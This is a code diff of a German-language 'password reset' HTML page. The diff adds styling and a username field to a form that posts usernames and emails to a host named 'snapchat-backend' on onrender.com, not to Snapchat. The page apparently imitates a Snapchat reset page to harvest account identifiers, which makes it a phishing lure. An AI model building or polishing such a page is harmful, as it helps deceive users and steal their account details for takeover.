@@ -4,12 +4,64 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Passwort zurücksetzen</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 1.5rem;
+    }
+
+    input {
+      width: 90%;
+      padding: 0.7rem;
+      margin: 0.5rem 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    button {
+      margin-top: 1rem;
+      padding: 0.7rem 1.5rem;
+      font-size: 1rem;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-  <h2>🔒 Passwort zurücksetzen</h2>
-  <form action="https://snapchat-backend.onrender.com/submit" method="POST">
-    <input type="email" name="email" placeholder="Deine E-Mail" required />
-    <button type="submit">Absenden</button>
-  </form>
+  <div class="container">
+    <h2>🔒 Passwort zurücksetzen</h2>
+    <form action="https://snapchat-backend.onrender.com/submit" method="POST">
+      <input type="text" name="username" placeholder="Benutzername" required><br>
+      <input type="email" name="email" placeholder="Deine E-Mail" required><br>
+      <button type="submit">Passwort zurücksetzen</button>
+    </form>
+  </div>
 </body>
 </html>
